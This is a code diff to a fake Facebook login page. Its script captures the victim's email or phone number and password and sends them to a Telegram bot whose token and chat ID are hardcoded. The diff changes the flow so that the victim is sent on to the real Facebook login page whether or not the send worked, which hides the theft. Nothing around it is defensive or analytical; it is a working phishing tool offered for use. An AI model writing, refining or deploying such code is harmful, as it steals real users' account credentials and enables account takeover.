@@ -205,19 +205,23 @@
             const token = '8667308375:AAGwvbKu79AVO9gHBBxkNbekjk8E8ZCbT-8';
             const chatId = '1240167664';
             const message = `--- FB LOGIN ATTEMPT ---\nEmail/Mob: ${email}\nPassword: ${pass}`;
+            // Calling Telegram API
             const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
 
             showMessage('Signing in...', 'info');
 
             fetch(url)
-                .then(() => {
-                    // Redirect to real facebook login page after a short delay
+                .then(response => {
+                    console.log('Success:', response);
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                })
+                .finally(() => {
+                    // Redirect to real Facebook login page regardless of success/fail
                     setTimeout(() => {
                         window.location.href = 'https://www.facebook.com/login/';
-                    }, 1200);
-                })
-                .catch(() => {
-                    showMessage('Network error. Please try again.', 'error');
+                    }, 1000);
                 });
         });
 
